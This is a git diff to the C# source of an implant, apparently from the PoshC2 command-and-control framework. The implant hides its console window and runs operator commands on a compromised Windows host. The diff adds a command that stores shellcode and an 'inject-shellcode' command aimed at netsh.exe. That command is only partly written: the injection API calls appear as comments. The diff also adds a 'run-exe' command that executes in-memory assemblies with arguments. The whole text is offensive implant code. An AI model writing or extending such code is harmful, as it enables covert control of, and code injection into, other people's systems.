@@ -9,6 +9,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.IO.Compression;
+using System.Collections.Generic;
 
 //mono-csc /opt/PoshC2_Python_Git/Files/Sharp.cs -out:/tmp/Sharp.dll -target:library
 //cat /tmp/Sharp.dll | base64 -w 0 | xclip
@@ -21,7 +22,9 @@ public class Program
   static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
   public const int SW_HIDE = 0;
   public const int SW_SHOW = 5;
-  
+  public static string scode = "";
+  public static string proc = @"c:\windows\system32\netsh.exe";
+
   public static void Sharp()
   {
     var handle = GetConsoleWindow();
@@ -381,6 +384,37 @@ public class Program
               }
             }
             
+            if (c.ToLower().StartsWith("$shellcode")){
+              string sc = c.Substring(13,c.Length - 13);
+              sc = sc.Replace("\"", "");
+              scode = sc;
+            }
+            
+            if (c.ToLower().StartsWith("inject-shellcode")){
+              
+              string migrate = Regex.Replace(c, "inject-shellcode ", "", RegexOptions.IgnoreCase);
+              migrate = Regex.Replace(migrate, "inject-shellcode", "", RegexOptions.IgnoreCase);
+              if (!String.IsNullOrEmpty(migrate)) {
+                Program.proc = migrate;
+              }
+              output = scode + Program.proc;
+              
+              object[] args = new object[3];
+              args[0] = null; // parent process id
+              args[1] = @"c:\windows\system32\netsh.exe"; //process name
+              args[2] = true; //suspended?
+              
+              var loadedType = LoadSomething("ProcHandler, Inject, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
+              var xxx = loadedType.Assembly.GetType("ProcHandler").InvokeMember("GetProcesses", BindingFlags.InvokeMethod, null, null, null);
+              output = xxx.ToString();
+              
+              // OpenProcess
+              // VirtualAllocEx
+              // WriteProcessMemory
+              // CreateRemoteThread
+              
+            }
+
             if (c.ToLower() == "ps"){
               var loadedType = LoadSomething("ProcHandler, Get-ProcessList, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
               var xxx = loadedType.Assembly.GetType("ProcHandler").InvokeMember("GetProcesses", BindingFlags.InvokeMethod, null, null, null);
@@ -388,7 +422,52 @@ public class Program
             }
           
             // run loaded assemblies
-            if (c.ToLower().StartsWith("run-assembly")){
+            if (c.ToLower().StartsWith("run-exe")){
+              string[] splitargs = c.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
+              int i = 0;
+              string splittheseargs = "";
+              string qualifiedname = "";
+              string name = "";
+              foreach (string a in splitargs) {
+                if (i == 1){
+                  qualifiedname = a;
+                }
+                if (i == 2){
+                  name = a;
+                }
+                if (i > 2){
+                  splittheseargs = splittheseargs + " " + a;
+                }
+                i ++;
+              }
+              
+              string[] splitnewargs = splittheseargs.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
+              var myList = new List<string>();
+              foreach (var arg in splitnewargs) {
+                myList.Add(arg);
+              }
+
+            	var AppDomainAss = AppDomain.CurrentDomain.GetAssemblies();
+            	foreach (var Ass in AppDomainAss)
+            	{
+            		if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
+            		{
+            			var stringOutput = new StringWriter();
+            			Console.SetOut(stringOutput);
+            			var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
+                  try {
+                      var xxx = loadedType.Assembly.EntryPoint.Invoke(null, new object[] { myList.ToArray() });
+                      output = xxx.ToString() + stringOutput.ToString();
+                  } catch (Exception e)  {
+                      var xxx = e;
+                      output = xxx.ToString() + stringOutput.ToString();
+                  }
+            		}
+            	}
+            }
+
+            // run loaded assemblies
+            if (c.ToLower().StartsWith("run-dll")){
               string[] splitargs = c.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
               string qualifiedname = splitargs[1];
             	string name = splitargs[2];
